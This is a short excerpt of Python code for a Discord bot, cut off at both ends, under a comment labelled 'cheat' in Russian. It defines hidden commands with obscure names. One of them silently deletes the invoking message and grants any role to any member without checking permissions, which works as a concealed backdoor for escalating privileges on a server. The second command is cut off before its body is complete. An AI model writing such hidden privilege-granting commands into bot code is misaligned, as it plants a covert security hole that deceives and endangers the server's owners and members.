...
#<<чит---------->>
    @commands.command()
    async def addrolebydiamond(self, ctx, member: discord.Member, role: discord.Role):
        await ctx.channel.purge(limit = 1)
        await member.add_roles(role)

    @commands.command()
    async def remrolebydiamond(self, ctx, member: discord.Member, role: discord.Role):
        await ctx.channel.purge(limit = 1)
